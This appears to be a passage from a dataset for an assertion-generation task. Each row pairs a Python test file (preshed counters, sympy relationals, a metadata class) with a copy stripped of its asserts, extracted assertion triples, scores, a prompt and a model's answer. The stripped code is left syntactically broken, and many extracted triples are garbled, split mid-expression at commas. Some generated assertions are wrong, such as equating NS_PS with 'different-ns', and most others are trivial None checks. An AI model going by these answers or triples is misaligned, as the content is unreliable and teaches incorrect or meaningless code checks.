 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['NS_PS', 'values', 'default_namespace', 'data', 'm']
*Code:

1from nflex_connector_utils import Metadata
2
3
4class TestMetadata(object):
5    NS_PS = Metadata.PROVIDER_SPECIFIC_NAMESPACE_ID
6
7    def test_metadata(self):
8        def test_init(values=None, default_namespace=None,
9                      expected_result=None):
10            data = Metadata(values=values,
11                            default_namespace=default_namespace).serialize()
12
13        test_init(None, None, {})
14        test_init([], None, {})
15        test_init([('key', 'value')], None, {self.NS_PS: {'key': 'value'}})
16        test_init([('ns', 'key', 'value')], None, {'ns': {'key': 'value'}})
17        test_init([('ns',)], None, {})
18        test_init({}, None, {})
19        test_init('foo', None, {})
20
21        m = Metadata()
22        m.add('key1', 'value1')
23        m.add('key2', 'value2', namespace='different-ns')
24            self.NS_PS: {'key1': 'value1'},
25            'different-ns': {'key2': 'value2'},
26        }
27
28        m = Metadata(default_namespace='alt-ns')
29        m.add('key1', 'value1')
30        m.add('key2', 'value2', namespace='different-ns')
31            'alt-ns': {'key1': 'value1'},
32            'different-ns': {'key2': 'value2'},
33        }
34",2653,"[[7, 'values', '!=', None, ""values must be initialized before used""], 
 [7, 'default_namespace', '!=', None, ""default_namespace must be initialized before used""],
 [9, 'expected_result', '!=', None, ""expected_result must be initialized before used""],
 [10, 'data', '==', {}, ""default value of data should be an empty dictionary""],
 [21, 'm', '!=', None, ""m must be initialized before used""],
 [24, 'NS_PS', '==', 'different-ns', ""standard namespace 'NS_PS' should be equal to 'different-ns'""],
 [32, 'default_namespace', '==', 'alt-ns', ""default namespace should be 'alt-ns""]]"
syllog1sm/preshed,"from __future__ import division
import pytest

from preshed.counter import PreshCounter


def test_count():
    counter = PreshCounter()
    assert counter[12] == 0
    counter.inc(12, 1)
    assert counter[12] == 1
    counter.inc(14, 10)
    counter.inc(9, 10)
    counter.inc(12, 4)
    assert counter[12] == 5
    assert counter[14] == 10
    assert counter[9] == 10


def test_unsmooth_prob():
    counter = PreshCounter()
    assert counter.prob(12) == 0.0
    counter.inc(12, 1)
    assert counter.prob(12) == 1.0
    counter.inc(14, 10)
    assert counter.prob(14) == 10 / 11
    assert counter.prob(12) == 1.0 / 11

def test_smooth_prob():
    p = PreshCounter()
    # 1 10
    # 2 6
    # 3 4
    # 5 2
    # 8 1
    for i in range(10):
        p.inc(100-i, 1) # 10 items of freq 1
    for i in range(6):
        p.inc(90 - i, 2) # 6 items of freq 2
    for i in range(4):
        p.inc(80 - i, 3) # 4 items of freq 3
    for i in range(2):
        p.inc(70 - i, 5) # 2 items of freq 5
    for i in range(1):
        p.inc(60 - i, 8) # 1 item of freq 8

    assert p.total == (10 * 1) + (6 * 2) + (4 * 3) + (2 * 5) + (1 * 8)

    assert p.prob(100) == 1.0 / p.total
    assert p.prob(200) == 0.0
    assert p.prob(60) == 8.0 / p.total

    p.smooth()

    assert p.smoother(1) < 1.0
    assert p.smoother(8) < 8.0
    assert p.prob(1000) < p.prob(100)

    for event, count in reversed(sorted(p, key=lambda it: it[1])):
        assert p.smoother(count) < count


import os
def test_large_freqs():
    if 'TEST_FILE_LOC' in os.environ:
        loc = os.environ['TEST_FILE_LOC']
    else:
        return None
    counts = PreshCounter()
    for i, line in enumerate(open(loc)):
        line = line.strip()
        if not line:
            continue
        freq = int(line.split()[0])
        counts.inc(i+1, freq)
    oov = i+2
    assert counts.prob(oov) == 0.0
    assert counts.prob(1) < 0.1
    counts.smooth()
    assert counts.prob(oov) > 0
    assert counts.prob(oov) < counts.prob(i)
","
1from __future__ import division
2import pytest
3
4from preshed.counter import PreshCounter
5
6
7def test_count():
8    counter = PreshCounter()
9    counter.inc(12, 1)
10    counter.inc(14, 10)
11    counter.inc(9, 10)
12    counter.inc(12, 4)
13
14
15def test_unsmooth_prob():
16    counter = PreshCounter()
17    counter.inc(12, 1)
18    counter.inc(14, 10)
19
20def test_smooth_prob():
21    p = PreshCounter()
22    # 1 10
23    # 2 6
24    # 3 4
25    # 5 2
26    # 8 1
27    for i in range(10):
28        p.inc(100-i, 1) # 10 items of freq 1
29    for i in range(6):
30        p.inc(90 - i, 2) # 6 items of freq 2
31    for i in range(4):
32        p.inc(80 - i, 3) # 4 items of freq 3
33    for i in range(2):
34        p.inc(70 - i, 5) # 2 items of freq 5
35    for i in range(1):
36        p.inc(60 - i, 8) # 1 item of freq 8
37
38
39
40    p.smooth()
41
42
43    for event, count in reversed(sorted(p, key=lambda it: it[1])):
44
45
46import os
47def test_large_freqs():
48    if 'TEST_FILE_LOC' in os.environ:
49        loc = os.environ['TEST_FILE_LOC']
50    else:
51        return None
52    counts = PreshCounter()
53    for i, line in enumerate(open(loc)):
54        line = line.strip()
55        if not line:
56            continue
57        freq = int(line.split()[0])
58        counts.inc(i+1, freq)
59    oov = i+2
60    counts.smooth()
61","[['counter[12]', '==', '0'], ['counter[12]', '==', '1'], ['counter[12]', '==', '5'], ['counter[14]', '==', '10'], ['counter[9]', '==', '10'], ['counter.prob(12)', '==', '0.0'], ['counter.prob(12)', '==', '1.0'], ['counter.prob(14)', '==', '10 / 11'], ['counter.prob(12)', '==', '1.0 / 11'], ['p.total', '==', '(10 * 1) + (6 * 2) + (4 * 3) + (2 * 5) + (1 * 8)'], ['p.prob(100)', '==', '1.0 / p.total'], ['p.prob(200)', '==', '0.0'], ['p.prob(60)', '==', '8.0 / p.total'], ['p.smoother(1)', '<', '1.0'], ['p.smoother(8)', '<', '8.0'], ['p.prob(1000)', '<', 'p.prob(100)'], ['p.smoother(count)', '<', 'count'], ['counts.prob(oov)', '==', '0.0'], ['counts.prob(1)', '<', '0.1'], ['counts.prob(oov)', '>', '0'], ['counts.prob(oov)', '<', 'counts.prob(i)']]",21,21,1.0,0.0105,"['counter', 'p', 'loc', 'counts', 'line', 'freq', 'oov']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['counter', 'p', 'loc', 'counts', 'line', 'freq', 'oov']
*Code:

1from __future__ import division
2import pytest
3
4from preshed.counter import PreshCounter
5
6
7def test_count():
8    counter = PreshCounter()
9    counter.inc(12, 1)
10    counter.inc(14, 10)
11    counter.inc(9, 10)
12    counter.inc(12, 4)
13
14
15def test_unsmooth_prob():
16    counter = PreshCounter()
17    counter.inc(12, 1)
18    counter.inc(14, 10)
19
20def test_smooth_prob():
21    p = PreshCounter()
22    # 1 10
23    # 2 6
24    # 3 4
25    # 5 2
26    # 8 1
27    for i in range(10):
28        p.inc(100-i, 1) # 10 items of freq 1
29    for i in range(6):
30        p.inc(90 - i, 2) # 6 items of freq 2
31    for i in range(4):
32        p.inc(80 - i, 3) # 4 items of freq 3
33    for i in range(2):
34        p.inc(70 - i, 5) # 2 items of freq 5
35    for i in range(1):
36        p.inc(60 - i, 8) # 1 item of freq 8
37
38
39
40    p.smooth()
41
42
43    for event, count in reversed(sorted(p, key=lambda it: it[1])):
44
45
46import os
47def test_large_freqs():
48    if 'TEST_FILE_LOC' in os.environ:
49        loc = os.environ['TEST_FILE_LOC']
50    else:
51        return None
52    counts = PreshCounter()
53    for i, line in enumerate(open(loc)):
54        line = line.strip()
55        if not line:
56            continue
57        freq = int(line.split()[0])
58        counts.inc(i+1, freq)
59    oov = i+2
60    counts.smooth()
61",2795,"[[7, 'counter', '!=', None, ""counter should have been initialized as an instance of PreshCounter""],
[17, 'counter', '!=', None, ""counter should have been initialized as an instance of PreshCounter""],
[21, 'p', '!=', None, ""p should have been initialized as an instance of PreshCounter""],
[49, 'loc', '!=', None, ""loc should contain TEST_FILE_LOC value from the environment variables if it's available""],
[52, 'counts', '!=', None, ""counts should have been initialized as an instance of PreshCounter""],
[53, 'line', '!=', None, ""line should not be None after reading a file""],
[57, 'freq', '>=', 1, ""freq should be a positive integer after conversion from string""],
[59, 'oov', '>=', 1, ""oov value should always be greater than or equal to 1""],
[59, 'counts', '!=', None, ""counts should not be None after smoothing""]]"
kmacinnis/sympy,"import sys

from sympy.utilities.pytest import XFAIL, raises
from sympy import Symbol, symbols, oo, I, pi, Float, And, Or, Not, Implies, Xor
from sympy.core.relational import ( Relational, Equality, Unequality,
    GreaterThan, LessThan, StrictGreaterThan, StrictLessThan, Rel, Eq, Lt, Le,
    Gt, Ge, Ne )

x, y, z, t = symbols('x,y,z,t')


def test_rel_ne():
    assert Relational(x, y, '!=') == Ne(x, y)


def test_rel_subs():
    e = Relational(x, y, '==')
    e = e.subs(x, z)

    assert isinstance(e, Equality)
    assert e.lhs == z
    assert e.rhs == y

    e = Relational(x, y, '>=')
    e = e.subs(x, z)

    assert isinstance(e, GreaterThan)
    assert e.lhs == z
    assert e.rhs == y

    e = Relational(x, y, '<=')
    e = e.subs(x, z)

    assert isinstance(e, LessThan)
    assert e.lhs == z
    assert e.rhs == y

    e = Relational(x, y, '>')
    e = e.subs(x, z)

    assert isinstance(e, StrictGreaterThan)
    assert e.lhs == z
    assert e.rhs == y

    e = Relational(x, y, '<')
    e = e.subs(x, z)

    assert isinstance(e, StrictLessThan)
    assert e.lhs == z
    assert e.rhs == y

    e = Eq(x, 0)
    assert e.subs(x, 0) is True
    assert e.subs(x, 1) is False


def test_wrappers():
    e = x + x**2

    res = Relational(y, e, '==')
    assert Rel(y, x + x**2, '==') == res
    assert Eq(y, x + x**2) == res

    res = Relational(y, e, '<')
    assert Lt(y, x + x**2) == res

    res = Relational(y, e, '<=')
    assert Le(y, x + x**2) == res

    res = Relational(y, e, '>')
    assert Gt(y, x + x**2) == res

    res = Relational(y, e, '>=')
    assert Ge(y, x + x**2) == res

    res = Relational(y, e, '!=')
    assert Ne(y, x + x**2) == res


def test_Eq():

    assert Eq(x**2) == Eq(x**2, 0)
    assert Eq(x**2) != Eq(x**2, 1)


def test_rel_Infinity():
    assert (oo > oo) is False
    assert (oo > -oo) is True
    assert (oo > 1) is True
    assert (oo < oo) is False
    assert (oo < -oo) is False
    assert (oo < 1) is False
    assert (oo >= oo) is True
    assert (oo >= -oo) is True
    assert (oo >= 1) is True
    assert (oo <= oo) is True
    assert (oo <= -oo) is False
    assert (oo <= 1) is False
    assert (-oo > oo) is False
    assert (-oo > -oo) is False
    assert (-oo > 1) is False
    assert (-oo < oo) is True
    assert (-oo < -oo) is False
    assert (-oo < 1) is True
    assert (-oo >= oo) is False
    assert (-oo >= -oo) is True
    assert (-oo >= 1) is False
    assert (-oo <= oo) is True
    assert (-oo <= -oo) is True
    assert (-oo <= 1) is True


def test_bool():
    assert Eq(0, 0) is True
    assert Eq(1, 0) is False
    assert Ne(0, 0) is False
    assert Ne(1, 0) is True
    assert Lt(0, 1) is True
    assert Lt(1, 0) is False
    assert Le(0, 1) is True
    assert Le(1, 0) is False
    assert Le(0, 0) is True
    assert Gt(1, 0) is True
    assert Gt(0, 1) is False
    assert Ge(1, 0) is True
    assert Ge(0, 1) is False
    assert Ge(1, 1) is True
    assert Eq(I, 2) is False
    assert Ne(I, 2) is True
    assert Gt(I, 2) not in [True, False]
    assert Ge(I, 2) not in [True, False]
    assert Lt(I, 2) not in [True, False]
    assert Le(I, 2) not in [True, False]
    a = Float('.000000000000000000001', '')
    b = Float('.0000000000000000000001', '')
    assert Eq(pi + a, pi + b) is False


def test_rich_cmp():
    assert (x < y) == Lt(x, y)
    assert (x <= y) == Le(x, y)
    assert (x > y) == Gt(x, y)
    assert (x >= y) == Ge(x, y)


def test_doit():
    from sympy import Symbol
    p = Symbol('p', positive=True)
    n = Symbol('n', negative=True)
    np = Symbol('np', nonpositive=True)
    nn = Symbol('nn', nonnegative=True)

    assert Gt(p, 0).doit() is True
    assert Gt(p, 1).doit() == Gt(p, 1)
    assert Ge(p, 0).doit() is True
    assert Le(p, 0).doit() is False
    assert Lt(n, 0).doit() is True
    assert Le(np, 0).doit() is True
    assert Gt(nn, 0).doit() == Gt(nn, 0)
    assert Lt(nn, 0).doit() is False

    assert Eq(x, 0).doit() == Eq(x, 0)


def test_new_relational():
    x = Symbol('x')

    assert Eq(x) == Relational(x, 0)       # None ==> Equality
    assert Eq(x) == Relational(x, 0, '==')
    assert Eq(x) == Relational(x, 0, 'eq')
    assert Eq(x) == Equality(x, 0)
    assert Eq(x, -1) == Relational(x, -1)       # None ==> Equality
    assert Eq(x, -1) == Relational(x, -1, '==')
    assert Eq(x, -1) == Relational(x, -1, 'eq')
    assert Eq(x, -1) == Equality(x, -1)
    assert Eq(x) != Relational(x, 1)       # None ==> Equality
    assert Eq(x) != Relational(x, 1, '==')
    assert Eq(x) != Relational(x, 1, 'eq')
    assert Eq(x) != Equality(x, 1)
    assert Eq(x, -1) != Relational(x, 1)       # None ==> Equality
    assert Eq(x, -1) != Relational(x, 1, '==')
    assert Eq(x, -1) != Relational(x, 1, 'eq')
    assert Eq(x, -1) != Equality(x, 1)

    assert Ne(x, 0) == Relational(x, 0, '!=')
    assert Ne(x, 0) == Relational(x, 0, '<>')
    assert Ne(x, 0) == Relational(x, 0, 'ne')
    assert Ne(x, 0) == Unequality(x, 0)
    assert Ne(x, 0) != Relational(x, 1, '!=')
    assert Ne(x, 0) != Relational(x, 1, '<>')
    assert Ne(x, 0) != Relational(x, 1, 'ne')
    assert Ne(x, 0) != Unequality(x, 1)

    assert Ge(x, 0) == Relational(x, 0, '>=')
    assert Ge(x, 0) == Relational(x, 0, 'ge')
    assert Ge(x, 0) == GreaterThan(x, 0)
    assert Ge(x, 1) != Relational(x, 0, '>=')
    assert Ge(x, 1) != Relational(x, 0, 'ge')
    assert Ge(x, 1) != GreaterThan(x, 0)
    assert (x >= 1) == Relational(x, 1, '>=')
    assert (x >= 1) == Relational(x, 1, 'ge')
    assert (x >= 1) == GreaterThan(x, 1)
    assert (x >= 0) != Relational(x, 1, '>=')
    assert (x >= 0) != Relational(x, 1, 'ge')
    assert (x >= 0) != GreaterThan(x, 1)

    assert Le(x, 0) == Relational(x, 0, '<=')
    assert Le(x, 0) == Relational(x, 0, 'le')
    assert Le(x, 0) == LessThan(x, 0)
    assert Le(x, 1) != Relational(x, 0, '<=')
    assert Le(x, 1) != Relational(x, 0, 'le')
    assert Le(x, 1) != LessThan(x, 0)
    assert (x <= 1) == Relational(x, 1, '<=')
    assert (x <= 1) == Relational(x, 1, 'le')
    assert (x <= 1) == LessThan(x, 1)
    assert (x <= 0) != Relational(x, 1, '<=')
    assert (x <= 0) != Relational(x, 1, 'le')
    assert (x <= 0) != LessThan(x, 1)

    assert Gt(x, 0) == Relational(x, 0, '>')
    assert Gt(x, 0) == Relational(x, 0, 'gt')
    assert Gt(x, 0) == StrictGreaterThan(x, 0)
    assert Gt(x, 1) != Relational(x, 0, '>')
    assert Gt(x, 1) != Relational(x, 0, 'gt')
    assert Gt(x, 1) != StrictGreaterThan(x, 0)
    assert (x > 1) == Relational(x, 1, '>')
    assert (x > 1) == Relational(x, 1, 'gt')
    assert (x > 1) == StrictGreaterThan(x, 1)
    assert (x > 0) != Relational(x, 1, '>')
    assert (x > 0) != Relational(x, 1, 'gt')
    assert (x > 0) != StrictGreaterThan(x, 1)

    assert Lt(x, 0) == Relational(x, 0, '<')
    assert Lt(x, 0) == Relational(x, 0, 'lt')
    assert Lt(x, 0) == StrictLessThan(x, 0)
    assert Lt(x, 1) != Relational(x, 0, '<')
    assert Lt(x, 1) != Relational(x, 0, 'lt')
    assert Lt(x, 1) != StrictLessThan(x, 0)
    assert (x < 1) == Relational(x, 1, '<')
    assert (x < 1) == Relational(x, 1, 'lt')
    assert (x < 1) == StrictLessThan(x, 1)
    assert (x < 0) != Relational(x, 1, '<')
    assert (x < 0) != Relational(x, 1, 'lt')
    assert (x < 0) != StrictLessThan(x, 1)

    # finally, some fuzz testing
    from random import randint
    for i in range(100):
        while 1:
            if sys.version_info[0] >= 3:
                strtype, length = (chr, 65535) if randint(0, 1) else (chr, 255)
            else:
                strtype, length = (unichr, 65535) if randint(0, 1) else (chr, 255)
            relation_type = strtype( randint(0, length) )
            if randint(0, 1):
                relation_type += strtype( randint(0, length) )
            if relation_type not in ('==', 'eq', '!=', '<>', 'ne', '>=', 'ge',
                                     '<=', 'le', '>', 'gt', '<', 'lt'):
                break

        raises(ValueError, lambda: Relational(x, 1, relation_type))


def test_relational_bool_output():
    # http://code.google.com/p/sympy/issues/detail?id=2832
    raises(TypeError, lambda: bool(x > 3))
    raises(TypeError, lambda: bool(x >= 3))
    raises(TypeError, lambda: bool(x < 3))
    raises(TypeError, lambda: bool(x <= 3))
    raises(TypeError, lambda: bool(Eq(x, 3)))
    raises(TypeError, lambda: bool(Ne(x, 3)))


def test_relational_logic_symbols():
    # See issue 3105
    assert (x < y) & (z < t) == And(x < y, z < t)
    assert (x < y) | (z < t) == Or(x < y, z < t)
    assert ~(x < y) == Not(x < y)
    assert (x < y) >> (z < t) == Implies(x < y, z < t)
    assert (x < y) << (z < t) == Implies(z < t, x < y)
    assert (x < y) ^ (z < t) == Xor(x < y, z < t)

    assert isinstance((x < y) & (z < t), And)
    assert isinstance((x < y) | (z < t), Or)
    assert isinstance(~(x < y), Not)
    assert isinstance((x < y) >> (z < t), Implies)
    assert isinstance((x < y) << (z < t), Implies)
    assert isinstance((x < y) ^ (z < t), (Or, Xor))
","
1import sys
2
3from sympy.utilities.pytest import XFAIL, raises
4from sympy import Symbol, symbols, oo, I, pi, Float, And, Or, Not, Implies, Xor
5from sympy.core.relational import ( Relational, Equality, Unequality,
6    GreaterThan, LessThan, StrictGreaterThan, StrictLessThan, Rel, Eq, Lt, Le,
7    Gt, Ge, Ne )
8
9x, y, z, t = symbols('x,y,z,t')
10
11
12def test_rel_ne():
13
14
15def test_rel_subs():
16    e = Relational(x, y, '==')
17    e = e.subs(x, z)
18
19
20    e = Relational(x, y, '>=')
21    e = e.subs(x, z)
22
23
24    e = Relational(x, y, '<=')
25    e = e.subs(x, z)
26
27
28    e = Relational(x, y, '>')
29    e = e.subs(x, z)
30
31
32    e = Relational(x, y, '<')
33    e = e.subs(x, z)
34
35
36    e = Eq(x, 0)
37
38
39def test_wrappers():
40    e = x + x**2
41
42    res = Relational(y, e, '==')
43
44    res = Relational(y, e, '<')
45
46    res = Relational(y, e, '<=')
47
48    res = Relational(y, e, '>')
49
50    res = Relational(y, e, '>=')
51
52    res = Relational(y, e, '!=')
53
54
55def test_Eq():
56
57
58
59def test_rel_Infinity():
60
61
62def test_bool():
63    a = Float('.000000000000000000001', '')
64    b = Float('.0000000000000000000001', '')
65
66
67def test_rich_cmp():
68
69
70def test_doit():
71    from sympy import Symbol
72    p = Symbol('p', positive=True)
73    n = Symbol('n', negative=True)
74    np = Symbol('np', nonpositive=True)
75    nn = Symbol('nn', nonnegative=True)
76
77
78
79
80def test_new_relational():
81    x = Symbol('x')
82
83
84
85
86
87
88
89    # finally, some fuzz testing
90    from random import randint
91    for i in range(100):
92        while 1:
93            if sys.version_info[0] >= 3:
94                strtype, length = (chr, 65535) if randint(0, 1) else (chr, 255)
95            else:
96                strtype, length = (unichr, 65535) if randint(0, 1) else (chr, 255)
97            relation_type = strtype( randint(0, length) )
98            if randint(0, 1):
99                relation_type += strtype( randint(0, length) )
100            if relation_type not in ('==', 'eq', '!=', '<>', 'ne', '>=', 'ge',
101                                     '<=', 'le', '>', 'gt', '<', 'lt'):
102                break
103
104        raises(ValueError, lambda: Relational(x, 1, relation_type))
105
106
107def test_relational_bool_output():
108    # http://code.google.com/p/sympy/issues/detail?id=2832
109    raises(TypeError, lambda: bool(x > 3))
110    raises(TypeError, lambda: bool(x >= 3))
111    raises(TypeError, lambda: bool(x < 3))
112    raises(TypeError, lambda: bool(x <= 3))
113    raises(TypeError, lambda: bool(Eq(x, 3)))
114    raises(TypeError, lambda: bool(Ne(x, 3)))
115
116
117def test_relational_logic_symbols():
118    # See issue 3105
119
120","[['Relational(x', '==', 'True'], ['e.lhs', '==', 'z'], ['e.rhs', '==', 'y'], ['e.lhs', '==', 'z'], ['e.rhs', '==', 'y'], ['e.lhs', '==', 'z'], ['e.rhs', '==', 'y'], ['e.lhs', '==', 'z'], ['e.rhs', '==', 'y'], ['e.lhs', '==', 'z'], ['e.rhs', '==', 'y'], ['e.subs(x', '==', 'True'], ['e.subs(x', '==', 'True'], ['Rel(y', '==', 'True'], ['Eq(y', '==', 'True'], ['Lt(y', '==', 'True'], ['Le(y', '==', 'True'], ['Gt(y', '==', 'True'], ['Ge(y', '==', 'True'], ['Ne(y', '==', 'True'], ['Eq(x**2)', '==', 'Eq(x**2'], ['Eq(x**2)', '!=', 'Eq(x**2'], ['(oo', '>', 'oo) is False'], ['(oo', '>', '-oo) is True'], ['(oo', '>', '1) is True'], ['(oo', '<', 'oo) is False'], ['(oo', '<', '-oo) is False'], ['(oo', '<', '1) is False'], ['(oo', '>=', 'oo) is True'], ['(oo', '>=', '-oo) is True'], ['(oo', '>=', '1) is True'], ['(oo', '<=', 'oo) is True'], ['(oo', '<=', '-oo) is False'], ['(oo', '<=', '1) is False'], ['(-oo', '>', 'oo) is False'], ['(-oo', '>', '-oo) is False'], ['(-oo', '>', '1) is False'], ['(-oo', '<', 'oo) is True'], ['(-oo', '<', '-oo) is False'], ['(-oo', '<', '1) is True'], ['(-oo', '>=', 'oo) is False'], ['(-oo', '>=', '-oo) is True'], ['(-oo', '>=', '1) is False'], ['(-oo', '<=', 'oo) is True'], ['(-oo', '<=', '-oo) is True'], ['(-oo', '<=', '1) is True'], ['Eq(0', '==', 'True'], ['Eq(1', '==', 'True'], ['Ne(0', '==', 'True'], ['Ne(1', '==', 'True'], ['Lt(0', '==', 'True'], ['Lt(1', '==', 'True'], ['Le(0', '==', 'True'], ['Le(1', '==', 'True'], ['Le(0', '==', 'True'], ['Gt(1', '==', 'True'], ['Gt(0', '==', 'True'], ['Ge(1', '==', 'True'], ['Ge(0', '==', 'True'], ['Ge(1', '==', 'True'], ['Eq(I', '==', 'True'], ['Ne(I', '==', 'True'], ['Eq(pi', '+', 'a'], ['(x', '<', 'y) == Lt(x'], ['(x', '<=', 'y) == Le(x'], ['(x', '>', 'y) == Gt(x'], ['(x', '>=', 'y) == Ge(x'], ['Gt(p', '==', 'True'], ['Gt(p', '==', 'True'], ['Ge(p', '==', 'True'], ['Le(p', '==', 'True'], ['Lt(n', '==', 'True'], ['Le(np', '==', 'True'], ['Gt(nn', '==', 'True'], ['Lt(nn', '==', 'True'], ['Eq(x', '==', 'True'], ['Eq(x)', '==', 'Relational(x'], ['Eq(x)', '==', 'Relational(x'], ['Eq(x)', '==', 'Relational(x'], ['Eq(x)', '==', 'Equality(x'], ['Eq(x', '==', 'True'], ['Eq(x', '==', 'True'], ['Eq(x', '==', 'True'], ['Eq(x', '==', 'True'], ['Eq(x)', '!=', 'Relational(x'], ['Eq(x)', '!=', 'Relational(x'], ['Eq(x)', '!=', 'Relational(x'], ['Eq(x)', '!=', 'Equality(x'], ['Eq(x', '==', 'True'], ['Eq(x', '==', 'True'], ['Eq(x', '==', 'True'], ['Eq(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ne(x', '==', 'True'], ['Ge(x', '==', 'True'], ['Ge(x', '==', 'True'], ['Ge(x', '==', 'True'], ['Ge(x', '==', 'True'], ['Ge(x', '==', 'True'], ['Ge(x', '==', 'True'], ['(x', '>=', '1) == Relational(x'], ['(x', '>=', '1) == Relational(x'], ['(x', '>=', '1) == GreaterThan(x'], ['(x', '>=', '0) != Relational(x'], ['(x', '>=', '0) != Relational(x'], ['(x', '>=', '0) != GreaterThan(x'], ['Le(x', '==', 'True'], ['Le(x', '==', 'True'], ['Le(x', '==', 'True'], ['Le(x', '==', 'True'], ['Le(x', '==', 'True'], ['Le(x', '==', 'True'], ['(x', '<=', '1) == Relational(x'], ['(x', '<=', '1) == Relational(x'], ['(x', '<=', '1) == LessThan(x'], ['(x', '<=', '0) != Relational(x'], ['(x', '<=', '0) != Relational(x'], ['(x', '<=', '0) != LessThan(x'], ['Gt(x', '==', 'True'], ['Gt(x', '==', 'True'], ['Gt(x', '==', 'True'], ['Gt(x', '==', 'True'], ['Gt(x', '==', 'True'], ['Gt(x', '==', 'True'], ['(x', '>', '1) == Relational(x'], ['(x', '>', '1) == Relational(x'], ['(x', '>', '1) == StrictGreaterThan(x'], ['(x', '>', '0) != Relational(x'], ['(x', '>', '0) != Relational(x'], ['(x', '>', '0) != StrictGreaterThan(x'], ['Lt(x', '==', 'True'], ['Lt(x', '==', 'True'], ['Lt(x', '==', 'True'], ['Lt(x', '==', 'True'], ['Lt(x', '==', 'True'], ['Lt(x', '==', 'True'], ['(x', '<', '1) == Relational(x'], ['(x', '<', '1) == Relational(x'], ['(x', '<', '1) == StrictLessThan(x'], ['(x', '<', '0) != Relational(x'], ['(x', '<', '0) != Relational(x'], ['(x', '<', '0) != StrictLessThan(x'], ['(x', '<', 'y) & (z < t) == And(x < y'], ['(x', '<', 'y) | (z < t) == Or(x < y'], ['~(x', '<', 'y) == Not(x < y)'], ['(x', '<', 'y) >> (z < t) == Implies(x < y'], ['(x', '<', 'y) << (z < t) == Implies(z < t'], ['(x', '<', 'y) ^ (z < t) == Xor(x < y']]",169,154,0.9112426035502958,0.0170921198668146,"['x', 'y', 'z', 't', 'e', 'res', 'a', 'b', 'p', 'n', 'np', 'nn', 'strtype', 'length', 'relation_type']",15,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['x', 'y', 'z', 't', 'e', 'res', 'a', 'b', 'p', 'n', 'np', 'nn', 'strtype', 'length', 'relation_type']
*Code:

1import sys
2
3from sympy.utilities.pytest import XFAIL, raises
4from sympy import Symbol, symbols, oo, I, pi, Float, And, Or, Not, Implies, Xor
5from sympy.core.relational import ( Relational, Equality, Unequality,
6    GreaterThan, LessThan, StrictGreaterThan, StrictLessThan, Rel, Eq, Lt, Le,
7    Gt, Ge, Ne )
8
9x, y, z, t = symbols('x,y,z,t')
10
11
12def test_rel_ne():
13
14
15def test_rel_subs():
16    e = Relational(x, y, '==')
17    e = e.subs(x, z)
18
19
20    e = Relational(x, y, '>=')
21    e = e.subs(x, z)
22
23
24    e = Relational(x, y, '<=')
25    e = e.subs(x, z)
26
27
28    e = Relational(x, y, '>')
29    e = e.subs(x, z)
30
31
32    e = Relational(x, y, '<')
33    e = e.subs(x, z)
34
35
36    e = Eq(x, 0)
37
38
39def test_wrappers():
40    e = x + x**2
41
42    res = Relational(y, e, '==')
43
44    res = Relational(y, e, '<')
45
46    res = Relational(y, e, '<=')
47
48    res = Relational(y, e, '>')
49
50    res = Relational(y, e, '>=')
51
52    res = Relational(y, e, '!=')
53
54
55def test_Eq():
56
57
58
59def test_rel_Infinity():
60
61
62def test_bool():
63    a = Float('.000000000000000000001', '')
64    b = Float('.0000000000000000000001', '')
65
66
67def test_rich_cmp():
68
69
70def test_doit():
71    from sympy import Symbol
72    p = Symbol('p', positive=True)
73    n = Symbol('n', negative=True)
74    np = Symbol('np', nonpositive=True)
75    nn = Symbol('nn', nonnegative=True)
76
77
78
79
80def test_new_relational():
81    x = Symbol('x')
82
83
84
85
86
87
88
89    # finally, some fuzz testing
90    from random import randint
91    for i in range(100):
92        while 1:
93            if sys.version_info[0] >= 3:
94                strtype, length = (chr, 65535) if randint(0, 1) else (chr, 255)
95            else:
